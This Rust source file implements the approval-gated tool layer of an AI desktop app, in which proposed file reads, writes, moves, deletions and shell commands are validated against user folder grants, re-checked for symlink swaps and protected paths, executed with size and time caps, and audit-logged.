        ToolAction::MovePath { .. } | ToolAction::DeletePath { .. }
    ) && let Some(path) = canonical
    {
        let home = std::env::home_dir();
        let roots: Vec<&Path> = store
            .grants
            .iter()
            .map(|grant| grant.canonical_path.as_path())
            .collect();
        if grants::is_protected_removal_target(home.as_deref(), dir, &roots, path) {
            return Err(Rejection::new(
                "scope",
                "this folder or file is protected and can never be moved away or deleted",
            ));
        }
    }
    Ok(())
}

/// Writes into credential stores, login items, shell startup files and key
/// files are refused outright, under any grant scope (even computer-wide),
/// any approval mode, and regardless of user approval (see
/// `grants::is_sensitive_write_target`). Moving and deleting count as
/// writes.
fn reject_sensitive_write(action: &ToolAction, canonical: &Path) -> Result<(), Rejection> {
    let is_write = matches!(
        action,
        ToolAction::WriteFile { .. }
            | ToolAction::ReplaceFile { .. }
            | ToolAction::MovePath { .. }
            | ToolAction::DeletePath { .. }
            | ToolAction::SaveImage { .. }
    );
    let home = std::env::home_dir();
    if is_write && grants::is_sensitive_write_target(home.as_deref(), canonical) {
        return Err(Rejection::new(
            "scope",
            "writes to credentials, login items, shell startup files and key files are never allowed",
        ));
    }
    Ok(())
}

/// Store a proposal (TTL + single-use enforced by the state map).
pub fn propose(
    dir: &Path,
    state: &ToolsState,
    profile_id: &str,
    conversation_id: Option<i64>,
    action: &ToolAction,
) -> Result<PendingProposal, Rejection> {
    propose_in(dir, state, profile_id, conversation_id, action, false)
}

/// [`propose`], optionally validating against the conversation's session
/// temp-folder grant even when folders ARE selected (`with_scratch`): the
/// `save_path` fallback for a destination outside every grant (round 6).
fn propose_in(
    dir: &Path,
    state: &ToolsState,
    profile_id: &str,
    conversation_id: Option<i64>,
    action: &ToolAction,
    with_scratch: bool,
) -> Result<PendingProposal, Rejection> {
    if !profile::is_known_profile_id(profile_id) {
        let rejection = Rejection::new("protocol", format!("unknown profile {profile_id}"));
        audit_rejection(dir, action, profile_id, &rejection)?;
        return Err(rejection);
    }
    let full = load_store(dir)?;
    // Validate against the conversation's selected grants only; the
    // protected-removal roots stay the FULL set (an unselected grant root is
    // still never deletable) plus the session temp folder.
    let store = match effective_store(&full, state, profile_id, conversation_id).and_then(|store| {
        with_session_scratch(store, state, profile_id, conversation_id, with_scratch)
    }) {
        Ok(store) => store,
        Err(rejection) => {
            audit_rejection(dir, action, profile_id, &rejection)?;
            return Err(rejection);
        }
    };
    let mut protect = full;
    protect.grants.extend(
        store
            .grants
            .iter()
            .filter(|grant| grant.id.starts_with(SCRATCH_GRANT_PREFIX))
            .cloned(),
    );
    let validated = match validate_action(&store, profile_id, action)
        .and_then(|validated| reject_protected(dir, &protect, validated))
    {
        Ok(validated) => validated,
        Err(rejection) => {
            audit_rejection(dir, action, profile_id, &rejection)?;
            return Err(rejection);
        }
    };
    let mut map = state
        .inner
        .lock()
        .map_err(|_| Rejection::new("io", "tools state poisoned"))?;
    prune_expired(&mut map, state.ttl);
    let id = uuid::Uuid::new_v4().to_string();
    let proposal = PendingProposal {
        id: id.clone(),
        profile_id: profile_id.to_string(),
        conversation_id,
        action: validated.action,
        summary: validated.summary.clone(),
        diff: validated.diff,
        grant_id: validated.grant_id,
        canonical_path: validated.canonical_path,
        dest_grant_id: validated.dest_grant_id,
        dest_path: validated.dest_path,
        permanent_delete: validated.permanent_delete,
        created_at: Instant::now(),
    };
    map.insert(id, proposal.clone());
    drop(map);
    audit_event(
        dir,
        AuditEntry {
            ts: audit::timestamp_now_rfc3339(),
            event: "propose".into(),
            action: proposal.action.kind().into(),
            outcome: "ok".into(),
            grant_id: proposal.grant_id.clone(),
            profile_id: Some(profile_id.to_string()),
            detail: Some(match conversation_id {
                Some(conversation_id) => {
                    format!("conversation {conversation_id}: {}", validated.summary)
                }
                None => validated.summary,
            }),
        },
    )?;
    Ok(proposal)
}

// ------------------------------------------------------------- execute --

/// Read helper: text file with the size cap + NUL-sniff binary check.
/// Returns the text or a `too_large` / `binary` rejection.
fn read_capped_text(path: &Path) -> Result<String, Rejection> {
    let meta = std::fs::metadata(path).map_err(|err| io_rejection("cannot stat file", err))?;
    if meta.len() as usize > MAX_FILE_BYTES {
        return Err(Rejection::new(
            "too_large",
            format!("file is {} bytes; cap is {MAX_FILE_BYTES}", meta.len()),
        ));
    }
    let bytes = std::fs::read(path).map_err(|err| io_rejection("cannot read file", err))?;
    if is_binary(&bytes) {
        return Err(Rejection::new(
            "binary",
            "binary file: refusing to read non-text content",
        ));
    }
    Ok(String::from_utf8_lossy(&bytes).into_owned())
}

/// NUL byte within the first sniff window marks binary content (spec S7).
fn is_binary(bytes: &[u8]) -> bool {
    let end = bytes.len().min(BINARY_SNIFF_BYTES);
    bytes[..end].contains(&0u8)
}

/// Execute a claimed proposal: re-verify grants/symlinks against the CURRENT
/// store, then run the exact stored action.
#[cfg_attr(not(test), allow(dead_code))]
pub fn execute_proposal(dir: &Path, proposal: &PendingProposal) -> Result<ToolOutcome, Rejection> {
    execute_proposal_with(dir, proposal, &[])
}

/// [`execute_proposal`] with the running app's session temp-folder grants
/// (`session`) added to the CURRENT store for re-verification.
fn execute_proposal_with(
    dir: &Path,
    proposal: &PendingProposal,
    session: &[grants::Grant],
) -> Result<ToolOutcome, Rejection> {
    let mut store = load_store(dir)?;
    store.grants.extend(session.iter().cloned());
    if matches!(proposal.action, ToolAction::RunCommand { .. }) && !store.tools_allow_run_command {
        return Err(Rejection::new(
            "disabled",
            "run_command was disabled after this proposal was created",
        ));
    }
    let grant_id = proposal
        .grant_id
        .as_deref()
        .ok_or_else(|| Rejection::new("protocol", "proposal has no grant"))?;
    let grant = store
        .grants
        .iter()
        .find(|grant| grant.id == grant_id)
        .ok_or_else(|| {
            Rejection::new(
                "no_grant",
                "the folder grant behind this proposal was revoked",
            )
        })?;
    let canonical = proposal
        .canonical_path
        .as_deref()
        .ok_or_else(|| Rejection::new("protocol", "proposal has no canonical path"))?;
    check_protected_paths(
        dir,
        &store,
        &proposal.action,
        Some(canonical),
        proposal.dest_path.as_deref(),
    )?;
    // Re-verify the exact stored paths against the CURRENT filesystem and
    // the CURRENT grant set before touching anything.
    match &proposal.action {
        ToolAction::ReadFile { .. }
        | ToolAction::ListFiles { .. }
        | ToolAction::DeletePath { .. } => {
            grants::verify_stable(&grant.canonical_path, canonical)?;
        }
        ToolAction::WriteFile { .. }
        | ToolAction::ReplaceFile { .. }
        | ToolAction::SaveImage { .. } => {
            grants::verify_writable(&grant.canonical_path, canonical)?;
        }
        ToolAction::RunCommand { cwd_in_grant, .. } => {
            prepare_command_cwd(&grant.canonical_path, Path::new(cwd_in_grant))?;
        }
        ToolAction::MovePath { .. } => {
            grants::verify_stable(&grant.canonical_path, canonical)?;
            let dest_grant = proposal
                .dest_grant_id
                .as_deref()
                .and_then(|id| store.grant_by_id(id))
                .ok_or_else(|| {
                    Rejection::new(
                        "no_grant",
                        "the folder grant behind the destination was revoked",
                    )
                })?;
            let dest = proposal
                .dest_path
                .as_deref()
                .ok_or_else(|| Rejection::new("protocol", "move proposal has no destination"))?;
            // Symlink-component walk on the destination, like writes.
            grants::verify_writable(&dest_grant.canonical_path, dest)?;
        }
    }
    // Dispatch the EXACT stored action.
    match &proposal.action {
        ToolAction::ReadFile { .. } => exec_read_file(canonical),
        ToolAction::ListFiles { .. } => exec_list_files(canonical),
        ToolAction::WriteFile { content, .. } => exec_write_file(canonical, content),
        ToolAction::ReplaceFile { old, new, .. } => exec_replace_file(canonical, old, new),
        ToolAction::MovePath { overwrite, .. } => {
            let dest = proposal
                .dest_path
                .as_deref()
                .ok_or_else(|| Rejection::new("protocol", "move proposal has no destination"))?;
            exec_move_path(canonical, dest, *overwrite)
        }
        ToolAction::DeletePath { .. } => exec_delete_path(canonical, proposal.permanent_delete),
        ToolAction::SaveImage { source, .. } => exec_save_image(Path::new(source), canonical),
        ToolAction::RunCommand { cmd, .. } => {
            let started = SystemTime::now();
            let output = run_captured(cmd, canonical, COMMAND_TIMEOUT)?;
            let produced =
                files_produced_by_command(dir, &grant.canonical_path, canonical, cmd, started);
            let truncated_note = if output.stdout_truncated || output.stderr_truncated {
                " (output truncated at 64 KiB)"
            } else {
                ""
            };
            Ok(ToolOutcome {
                action: "run_command".into(),
                summary: format!(
                    "{}: exit {}{}{truncated_note}",
                    proposal.summary,
                    output
                        .exit_code
                        .map(|code| code.to_string())
                        .unwrap_or_else(|| "signal".into()),
                    if output.timed_out {
                        " (killed after timeout)"
                    } else {
                        ""
                    }
                ),
                stdout: Some(output.stdout),
                stderr: Some(output.stderr),
                exit_code: output.exit_code,
                timed_out: output.timed_out,
                produced,
                ..Default::default()
            })
        }
    }
}

/// Make a command's working folder ready right before it runs. An existing
/// cwd must still canonicalize to the stored path (symlink-swap defense)
/// and be a folder. A MISSING cwd inside the grant is created first: models
/// routinely run `mkdir -p X && cd X && …` with `cwd` = X, the folder the
/// command itself creates (round-3 regression: the re-verification used to
/// demand an existing cwd and failed with `path no longer resolves`).
/// Creation goes through the same symlink-component walk as writes, so a
/// dangling symlink cannot redirect it outside the grant.
fn prepare_command_cwd(root: &Path, cwd: &Path) -> Result<(), Rejection> {
    match std::fs::symlink_metadata(cwd) {
        Ok(meta) if meta.is_dir() => grants::verify_stable(root, cwd),
        Ok(meta) if meta.file_type().is_symlink() => {
            grants::verify_stable(root, cwd)?;
            if cwd.is_dir() {
                Ok(())
            } else {
                Err(not_a_folder(cwd))
            }
        }
        Ok(_) => Err(not_a_folder(cwd)),
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => {
            grants::verify_writable(root, cwd)?;
            std::fs::create_dir_all(cwd)
                .map_err(|err| io_rejection("cannot create the command's folder", err))?;
            grants::verify_stable(root, cwd)
        }
        Err(err) => Err(io_rejection("cannot stat the command's folder", err)),
    }
}

fn not_a_folder(path: &Path) -> Rejection {
    Rejection::new(
        "not_a_folder",
        format!("{} is not a folder; pass the folder as cwd", path.display()),
    )
}

/// Folder depth scanned below a command's cwd for produced files.
const PRODUCED_SCAN_DEPTH: usize = 3;
/// Entries visited at most while scanning (bounds a computer-wide cwd).
const PRODUCED_SCAN_BUDGET: usize = 5_000;
/// Produced files reported at most per command.
const MAX_PRODUCED: usize = 20;

/// Regular files a command created or changed: files under its cwd (a few
/// levels deep, hidden folders and `node_modules` skipped) plus absolute
/// paths named on the command line, modified since it started, inside the
/// grant and never inside the app's own data dir. Symlinks are never
/// followed or reported. Sorted, deduplicated, capped.
fn files_produced_by_command(
    app_dir: &Path,
    root: &Path,
    cwd: &Path,
    cmd: &str,
    started: SystemTime,
) -> Vec<String> {
    // Whole-second floor: some filesystems store mtimes in seconds.
    let since = started
        .duration_since(SystemTime::UNIX_EPOCH)
        .map(|elapsed| SystemTime::UNIX_EPOCH + Duration::from_secs(elapsed.as_secs()))
        .unwrap_or(started);
    let protected = std::fs::canonicalize(app_dir).unwrap_or_else(|_| app_dir.to_path_buf());
    let fresh = |path: &Path| -> bool {
        std::fs::symlink_metadata(path).is_ok_and(|meta| {
            meta.file_type().is_file() && meta.modified().is_ok_and(|modified| modified >= since)
        })
    };
    let mut found: Vec<PathBuf> = Vec::new();
    let mut budget = PRODUCED_SCAN_BUDGET;
    scan_produced(cwd, 1, &mut budget, &fresh, &mut found);
    let separators = |c: char| {
        c.is_whitespace()
            || matches!(
                c,
                ';' | '|' | '&' | '>' | '<' | '\'' | '"' | '(' | ')' | '=' | '`'
            )
    };
    for token in cmd.split(separators) {
        if !token.starts_with('/') || grants::has_parent_component(Path::new(token)) {
            continue;
        }
        if !fresh(Path::new(token)) {
            continue;
        }
        if let Ok(canonical) = std::fs::canonicalize(token) {
            found.push(canonical);
        }
    }
    let mut produced: Vec<String> = found
        .into_iter()
        .filter(|path| grants::is_under(root, path) && !grants::is_under(&protected, path))
        .map(|path| path.display().to_string())
        .collect();
    produced.sort();
    produced.dedup();
    produced.truncate(MAX_PRODUCED);
    produced
}

fn scan_produced(
    folder: &Path,
    depth: usize,
    budget: &mut usize,
    fresh: &dyn Fn(&Path) -> bool,
    found: &mut Vec<PathBuf>,
) {
    if depth > PRODUCED_SCAN_DEPTH {
        return;
    }
    let Ok(entries) = std::fs::read_dir(folder) else {
        return;
    };
    for entry in entries.flatten() {
        if *budget == 0 {
            return;
        }
        *budget -= 1;
        let name = entry.file_name();
        let name = name.to_string_lossy();
        if name.starts_with('.') || name == "node_modules" {
            continue;
        }
        let Ok(file_type) = entry.file_type() else {
            continue;
        };
        let path = entry.path();
        if file_type.is_dir() {
            scan_produced(&path, depth + 1, budget, fresh, found);
        } else if file_type.is_file() && fresh(&path) {
            found.push(path);
        }
    }
}

fn exec_read_file(path: &Path) -> Result<ToolOutcome, Rejection> {
    let content = read_capped_text(path)?;
    Ok(ToolOutcome {
        action: "read_file".into(),
        summary: format!("read {} bytes from {}", content.len(), path.display()),
        content: Some(content),
        ..Default::default()
    })
}

fn exec_list_files(root: &Path) -> Result<ToolOutcome, Rejection> {
    if !root.is_dir() {
        return Err(Rejection::new(
            "io",
            format!("{} is not a folder", root.display()),
        ));
    }
    let mut entries: Vec<String> = Vec::new();
    let truncated = collect_entries(root, "", 1, &mut entries)?;
    entries.sort();
    let note = if truncated {
        format!(" (truncated at {MAX_LIST_ENTRIES} entries)")
    } else {
        String::new()
    };
    Ok(ToolOutcome {
        action: "list_files".into(),
        summary: format!(
            "list_files {}: {} entries{}",
            root.display(),
            entries.len(),
            note
        ),
        entries: Some(entries),
        ..Default::default()
    })
}

/// Pre-order listing with depth/entry caps. Symlinks are listed but never
/// followed, so a symlinked dir cannot leak an outside tree.
fn collect_entries(
    dir: &Path,
    prefix: &str,
    depth: usize,
    out: &mut Vec<String>,
) -> Result<bool, Rejection> {
    if depth > MAX_LIST_DEPTH {
        return Ok(false);
    }
    let read = std::fs::read_dir(dir).map_err(|err| io_rejection("cannot list folder", err))?;
    let mut names: Vec<(String, bool, bool)> = Vec::new(); // (name, is_dir, is_symlink)
    let mut scan_truncated = false;
    for entry in read {
        // Stop READING at the scan bound: a huge flat dir must not be
        // buffered in full before the 500-entry cap applies.
        if names.len() >= MAX_LIST_SCAN {
            scan_truncated = true;
            break;
        }
        let entry = entry.map_err(|err| io_rejection("cannot read folder entry", err))?;
        let name = entry.file_name().to_string_lossy().into_owned();
        let meta = std::fs::symlink_metadata(entry.path())
            .map_err(|err| io_rejection("cannot stat entry", err))?;
        names.push((name, meta.is_dir(), meta.file_type().is_symlink()));
    }
    names.sort_by(|a, b| a.0.cmp(&b.0));
    for (name, is_dir, is_symlink) in names {
        if out.len() >= MAX_LIST_ENTRIES {
            return Ok(true);
        }
        let suffix = if is_symlink {
            " (symlink)"
        } else if is_dir {
            "/"
        } else {
            ""
        };
        out.push(format!("{prefix}{name}{suffix}"));
        if is_dir && !is_symlink {
            let truncated = collect_entries(
                &dir.join(&name),
                &format!("{prefix}{name}/"),
                depth + 1,
                out,
            )?;
            if truncated {
                return Ok(true);
            }
        }
    }
    Ok(scan_truncated)
}

fn exec_write_file(path: &Path, content: &str) -> Result<ToolOutcome, Rejection> {
    std::fs::write(path, content).map_err(|err| io_rejection("cannot write file", err))?;
    Ok(ToolOutcome {
        action: "write_file".into(),
        summary: format!("wrote {} bytes to {}", content.len(), path.display()),
        bytes_written: Some(content.len() as u64),
        produced: vec![path.display().to_string()],
        ..Default::default()
    })
}

fn exec_save_image(source: &Path, path: &Path) -> Result<ToolOutcome, Rejection> {
    // A folder or symlink that appeared at the destination after propose is
    // never written through (verify_writable already refused a symlink leaf).
    if std::fs::symlink_metadata(path).is_ok_and(|meta| !meta.file_type().is_file()) {
        return Err(Rejection::new(
            "protocol",
            "the destination is not a regular file; not replacing it",
        ));
    }
    let bytes = std::fs::read(source).map_err(|err| io_rejection("cannot read the image", err))?;
    std::fs::write(path, &bytes).map_err(|err| io_rejection("cannot save the image", err))?;
    Ok(ToolOutcome {
        action: "save_image".into(),
        summary: format!(
            "saved the image ({} bytes) to {}",
            bytes.len(),
            path.display()
        ),
        bytes_written: Some(bytes.len() as u64),
        produced: vec![path.display().to_string()],
        ..Default::default()
    })
}

fn exec_replace_file(path: &Path, old: &str, new: &str) -> Result<ToolOutcome, Rejection> {
    // Re-read and re-check uniqueness against the CURRENT file state; the
    // approved semantic is "replace the single occurrence of old".
    let current = read_capped_text(path)?;
    let matches = current.matches(old).count();
    if matches == 0 {
        return Err(Rejection::new(
            "not_found",
            "old text not found in the current file (changed since propose?)",
        ));
    }
    if matches > 1 {
        return Err(Rejection::new(
            "ambiguous",
            format!("old text matches {matches} times in the current file"),
        ));
    }
    let updated = current.replacen(old, new, 1);
    if updated.len() > MAX_FILE_BYTES {
        return Err(Rejection::new(
            "too_large",
            "resulting file would exceed the 2 MiB cap",
        ));
    }
    std::fs::write(path, &updated).map_err(|err| io_rejection("cannot write file", err))?;
    Ok(ToolOutcome {
        action: "replace_file".into(),
        summary: format!(
            "replaced 1 occurrence in {} ({} → {} bytes)",
            path.display(),
            current.len(),
            updated.len()
        ),
        bytes_written: Some(updated.len() as u64),
        produced: vec![path.display().to_string()],
        ..Default::default()
    })
}

fn exec_move_path(source: &Path, dest: &Path, overwrite: bool) -> Result<ToolOutcome, Rejection> {
    // Re-check the overwrite contract against the CURRENT destination:
    // `rename` silently replaces files, so an entry that appeared after
    // propose must not be clobbered without the explicit flag, and a
    // folder is never replaced.
    let replaced = match std::fs::symlink_metadata(dest) {
        Ok(meta) => {
            if !overwrite {
                return Err(Rejection::new(
                    "exists",
                    "the destination appeared after the proposal; not replacing it",
                ));
            }
            if meta.is_dir() || meta.file_type().is_symlink() {
                return Err(Rejection::new(
                    "protocol",
                    "the destination is not a regular file; not replacing it",
                ));
            }
            true
        }
        Err(err) if err.kind() == std::io::ErrorKind::NotFound => false,
        Err(err) => return Err(io_rejection("cannot stat destination", err)),
    };
    std::fs::rename(source, dest).map_err(|err| io_rejection("cannot move", err))?;
    Ok(ToolOutcome {
        action: "move_path".into(),
        summary: format!(
            "moved {} to {}{}",
            source.display(),
            dest.display(),
            if replaced {
                " (replaced the existing file)"
            } else {
                ""
            }
        ),
        produced: if dest.is_file() {
            vec![dest.display().to_string()]
        } else {
            Vec::new()
        },
        ..Default::default()
    })
}

fn exec_delete_path(path: &Path, permanent: bool) -> Result<ToolOutcome, Rejection> {
    if permanent {
        let meta =
            std::fs::symlink_metadata(path).map_err(|err| io_rejection("cannot stat path", err))?;
        // remove_dir_all never follows symlinks inside the tree.
        let removed = if meta.is_dir() {
            std::fs::remove_dir_all(path)
        } else {
            std::fs::remove_file(path)
        };
        removed.map_err(|err| io_rejection("cannot delete", err))?;
        return Ok(ToolOutcome {
            action: "delete_path".into(),
            summary: format!(
                "deleted {} permanently (no trash available on this volume)",
                path.display()
            ),
            ..Default::default()
        });
    }
    // The approved semantic was "to the trash": if the trash fails now,
    // fail closed instead of silently deleting permanently.
    trash::move_to_trash(trash::trash_home().as_deref(), path)?;
    Ok(ToolOutcome {
        action: "delete_path".into(),
        summary: format!("moved {} to the trash", path.display()),
        ..Default::default()
    })
}

/// Captured process output for `run_command`.
#[derive(Debug, Clone)]
pub struct CmdOutput {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: Option<i32>,
    pub timed_out: bool,
    pub stdout_truncated: bool,
    pub stderr_truncated: bool,
}

/// Spawn `cmd` in `cwd` through the platform shell, capture output with the
/// 64 KiB cap and kill the process after `timeout`. Experimental (S7).
///
/// Unix: the child runs in its OWN process group (`process_group(0)`), so
/// the timeout kill takes the whole tree via `killpg` — without it, a forked
/// grandchild that outlives the shell keeps the pipes open and the drain
/// threads blocked. Residual: grandchildren that survive the kill (killed
/// group members only; a double-fork daemon reparents to init) keep the
/// abandoned reader threads alive until their pipe writers close — `execute`
/// still returns after `DRAIN_GRACE` with the output collected so far.
pub fn run_captured(cmd: &str, cwd: &Path, timeout: Duration) -> Result<CmdOutput, Rejection> {
    #[cfg(unix)]
    let (program, args): (&str, Vec<String>) = ("sh", vec!["-c".into(), cmd.to_string()]);
    #[cfg(windows)]
    let (program, args): (&str, Vec<String>) = ("cmd", vec!["/C".into(), cmd.to_string()]);
    let mut command = std::process::Command::new(program);
    command
        .args(&args)
        .current_dir(cwd)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        // Own process group (pgid = pid): the timeout kill can then take the
        // whole tree with one killpg instead of just the shell.
        command.process_group(0);
    }
    let mut child = command
        .spawn()
        .map_err(|err| io_rejection("cannot spawn command", err))?;

    // Reader threads drain the pipes (streaming chunks through a channel,
    // discarding beyond the cap) so the child never blocks on a full pipe;
    // killing on timeout then works. The receiver waits BOUNDED (B3): a
    // pipe-holding grandchild must not block `execute` forever.
    use std::io::Read;
    use std::sync::mpsc::{self, Receiver, RecvTimeoutError};

    /// Streamed drain: sends (chunk, false) as data arrives and a final
    /// (empty, truncated) sentinel at EOF. An abandoned receiver (grace
    /// expired) makes sends fail, which stops the thread early.
    fn drain_capped<R: Read + Send + 'static>(mut stream: R) -> Receiver<(Vec<u8>, bool)> {
        let (tx, rx) = mpsc::channel();
        std::thread::spawn(move || {
            let mut buffered = 0usize;
            let mut chunk = [0u8; 8192];
            let mut truncated = false;
            loop {
                match stream.read(&mut chunk) {
                    Ok(0) => break,
                    Ok(read_len) => {
                        let room = MAX_OUTPUT_BYTES.saturating_sub(buffered);
                        if room == 0 {
                            truncated = true; // keep draining, discard the rest
                        } else {
                            let take = read_len.min(room);
                            if tx.send((chunk[..take].to_vec(), false)).is_err() {
                                break; // receiver gone — abandon the drain
                            }
                            buffered += take;
                            if take < read_len {
                                truncated = true;
                            }
                        }
                    }
                    Err(_) => break,
                }
            }
            let _ = tx.send((Vec::new(), truncated)); // EOF sentinel
        });
        rx
    }

    /// Bounded receive: accumulates streamed chunks until the EOF sentinel,
    /// the DRAIN_GRACE deadline, or the sender disappearing. The deadline
    /// and disconnect paths return the partial output marked truncated.
    fn recv_drained(rx: Receiver<(Vec<u8>, bool)>) -> (Vec<u8>, bool) {
        let mut buffer = Vec::new();
        let deadline = Instant::now() + DRAIN_GRACE;
        loop {
            let remaining = deadline.saturating_duration_since(Instant::now());
            match rx.recv_timeout(remaining) {
                Ok((chunk, false)) => buffer.extend_from_slice(&chunk),
                Ok((_, truncated)) => return (buffer, truncated), // EOF sentinel
                Err(RecvTimeoutError::Timeout | RecvTimeoutError::Disconnected) => {
                    // Incomplete: pipe still open after the grace (or the
                    // reader died) — return what we have, marked truncated.
                    return (buffer, true);
                }
            }
        }
    }

    let stdout_rx = drain_capped(
        child
            .stdout
            .take()
            .ok_or_else(|| Rejection::new("io", "command stdout unavailable"))?,
    );
    let stderr_rx = drain_capped(
        child
            .stderr
            .take()
            .ok_or_else(|| Rejection::new("io", "command stderr unavailable"))?,
    );

    let deadline = Instant::now() + timeout;
    let mut timed_out = false;
    let status: Option<std::process::ExitStatus> = loop {
        match child.try_wait() {
            Ok(Some(status)) => break Some(status),
            Ok(None) => {
                if Instant::now() >= deadline {
                    kill_command(&mut child);
                    timed_out = true;
                    break None;
                }
                std::thread::sleep(Duration::from_millis(25));
            }
            Err(err) => return Err(io_rejection("cannot wait for command", err)),
        }
    };
    let (stdout_bytes, stdout_truncated) = recv_drained(stdout_rx);
    let (stderr_bytes, stderr_truncated) = recv_drained(stderr_rx);
    Ok(CmdOutput {
        stdout: String::from_utf8_lossy(&stdout_bytes).into_owned(),
        stderr: String::from_utf8_lossy(&stderr_bytes).into_owned(),
        exit_code: status.and_then(|status| status.code()),
        timed_out,
        stdout_truncated,
        stderr_truncated,
    })
}

/// Kill the command and reap it. Unix: SIGKILL the whole process GROUP —
/// the child owns that group (`process_group(0)`), so forked children die
/// with it and release the pipes; a plain `child.kill()` would leave them
/// holding the pipes and block the drain threads.
fn kill_command(child: &mut std::process::Child) {
    #[cfg(unix)]
    {
        let pgid = child.id() as i32;
        // SAFETY: kill(2) with a negative pid signals the process group we
        // created with process_group(0); SIGKILL cannot be caught.
        unsafe {
            libc::kill(-pgid, libc::SIGKILL);
        }
    }
    let _ = child.kill();
    let _ = child.wait();
}

/// Claim a proposal (single-use) and execute the exact stored action.
/// Audit: `approve` when claimed, `execute` with the outcome.
pub fn execute(
    dir: &Path,
    state: &ToolsState,
    proposal_id: &str,
) -> Result<ToolOutcome, Rejection> {
    let claimed = {
        let mut map = state
            .inner
            .lock()
            .map_err(|_| Rejection::new("io", "tools state poisoned"))?;
        // Expiry check BEFORE claiming: an expired proposal is removed and
        // can never be executed (single-use, TTL 5 minutes).
        if map
            .get(proposal_id)
            .is_some_and(|proposal| proposal.created_at.elapsed() > state.ttl)
        {
            map.remove(proposal_id);
            return Err(Rejection::new(
                "expired",
                "proposal expired (TTL 5 minutes), ask for a new one",
            ));
        }
        map.remove(proposal_id)
            .ok_or_else(|| Rejection::new("unknown_proposal", "no pending proposal with this id"))?
    };
    audit_event(
        dir,
        AuditEntry {
            ts: audit::timestamp_now_rfc3339(),
            event: "approve".into(),
            action: claimed.action.kind().into(),
            outcome: "ok".into(),
            grant_id: claimed.grant_id.clone(),
            profile_id: Some(claimed.profile_id.clone()),
            detail: Some(match claimed.conversation_id {
                Some(conversation_id) => {
                    format!("conversation {conversation_id}: proposal claimed for execute")
                }
                None => "proposal claimed for execute".to_string(),
            }),
        },
    )?;
    match execute_proposal_with(dir, &claimed, &session_grants(state, &claimed)) {
        Ok(outcome) => {
            audit_event(
                dir,
                AuditEntry {
                    ts: audit::timestamp_now_rfc3339(),
                    event: "execute".into(),
                    action: claimed.action.kind().into(),
                    outcome: "ok".into(),
                    grant_id: claimed.grant_id.clone(),
                    profile_id: Some(claimed.profile_id.clone()),
                    detail: Some(outcome.summary.clone()),
                },
            )?;
            Ok(outcome)
        }
        Err(rejection) => {
            audit_event(
                dir,
                AuditEntry {
                    ts: audit::timestamp_now_rfc3339(),
                    event: "execute".into(),
                    action: claimed.action.kind().into(),
                    outcome: "error".into(),
                    grant_id: claimed.grant_id.clone(),
                    profile_id: Some(claimed.profile_id.clone()),
                    detail: Some(format!("kind={}: {}", rejection.kind, rejection.message)),
                },
            )?;
            Err(rejection)
        }
    }
}

/// Discard a proposal. Unknown/expired ids are a no-op (outcome `ignored`).
pub fn deny(dir: &Path, state: &ToolsState, proposal_id: &str) -> Result<(), String> {
    let removed = {
        let mut map = state
            .inner
            .lock()
            .map_err(|_| "tools state poisoned".to_string())?;
        map.remove(proposal_id)
    };
    audit::append(
        dir,
        &AuditEntry {
            ts: audit::timestamp_now_rfc3339(),
            event: "deny".into(),
            action: removed
                .as_ref()
                .map(|proposal| proposal.action.kind().to_string())
                .unwrap_or_else(|| "unknown".into()),
            outcome: if removed.is_some() { "ok" } else { "ignored" }.into(),
            grant_id: removed
                .as_ref()
                .and_then(|proposal| proposal.grant_id.clone()),
            profile_id: removed.as_ref().map(|proposal| proposal.profile_id.clone()),
            detail: removed.as_ref().map(|proposal| proposal.summary.clone()),
        },
    )?;
    Ok(())
}

// ------------------------------------------------------------ commands --
//
// P0-3 regression note: every command below that opens a NATIVE dialog
// (folder picker, confirmation) is `async` and runs the plugin's blocking
// call on Tauri's blocking pool (`spawn_blocking`). Tauri v2 runs SYNC
// commands on the main thread, and the dialog plugin's `blocking_*` calls
// wait for the main thread to show the dialog — a sync command calling
// them deadlocks the app (the "Choose folder…" hang on macOS). Never call
// `blocking_pick_folder` / `blocking_show` from a sync command again.

/// Run a blocking native-dialog closure off both the main thread and the
/// async runtime's worker threads. A panicked/cancelled join is treated as
/// "no answer" (`None`), which every caller maps to "nothing granted".
async fn off_main_thread<T, F>(work: F) -> Option<T>
where
    T: Send + 'static,
    F: FnOnce() -> T + Send + 'static,
{
    tauri::async_runtime::spawn_blocking(work).await.ok()
}

/// Two-button native confirmation (renderer-proof: a compromised renderer
/// cannot fake, suppress or auto-confirm it). Must run off the main thread.
fn native_confirm(app: &AppHandle, title: &str, text: String, ok: &str, cancel: &str) -> bool {
    use tauri_plugin_dialog::{DialogExt, MessageDialogButtons, MessageDialogKind};
    app.dialog()
        .message(text)
        .title(title)
        .kind(MessageDialogKind::Warning)
        .buttons(MessageDialogButtons::OkCancelCustom(
            ok.to_string(),
            cancel.to_string(),
        ))
        .blocking_show()
}

/// Register a folder grant for a profile. The ONLY way in is the NATIVE
/// folder picker opened from the Rust core (external review B1): the picked
/// path never crosses the renderer, so a compromised renderer cannot add a
/// grant by typing a path. Returns None when the user cancels the picker.
///
/// `mode` (S13, optional, default `ask`) picks the approval mode at grant
/// time; `allow` additionally requires the native confirmation of
/// [`confirm_allow_mode`] and falls back to `ask` when declined.
///
/// `async` on purpose (P0-3): see the regression note above.
#[tauri::command]
pub async fn tools_grant_add(
    app: AppHandle,
    profile_id: String,
    mode: Option<String>,
) -> Result<Option<grants::Grant>, Rejection> {
    use tauri_plugin_dialog::DialogExt;
    let dir = data_dir(&app).map_err(|err| Rejection::new("io", err))?;
    if !profile::is_known_profile_id(&profile_id) {
        return Err(Rejection::new("protocol", "unknown profile"));
    }
    let requested_mode = match mode.as_deref() {
        Some(raw) => ApprovalMode::parse(raw)?,
        None => ApprovalMode::Ask,
    };
    let picker_app = app.clone();
    let picked = off_main_thread(move || picker_app.dialog().file().blocking_pick_folder())
        .await
        .flatten();
    let Some(picked) = picked else {
        // User cancelled the picker — not an error, nothing granted.
        return Ok(None);
    };
    let path = picked.into_path().map_err(|err| {
        Rejection::new(
            "protocol",
            format!("picker returned an unusable path: {err}"),
        )
    })?;
    let canonical = std::fs::canonicalize(&path).map_err(|err| {
        Rejection::new(
            "protocol",
            format!("cannot resolve folder {}: {err}", path.display()),
        )
    })?;
    if !canonical.is_dir() {
        return Err(Rejection::new("protocol", "grant path must be a folder"));
    }
